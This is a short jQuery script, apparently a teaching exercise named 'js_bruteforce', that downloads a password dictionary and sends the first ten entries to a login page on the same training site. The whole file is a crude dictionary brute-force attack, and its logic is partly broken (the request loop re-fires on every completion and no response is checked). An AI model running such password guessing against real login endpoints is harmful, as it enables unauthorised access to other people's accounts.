var psw = {}
$.ajax({
	url: "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt"
	, complete: function (result) {
		psw = result.responseText.split("\n");
		/*$("div").html(result);*/
	}
});


$(document).ajaxComplete(function () {
	for (var i = 0; i < 10; i++) {
		$.ajax({
			url: "http://docusland.fr/code-academie/js_bruteforce/index.php"
			, password: psw[i]
			, complete: function (answer) {
				return true;
		}
		});
	}
});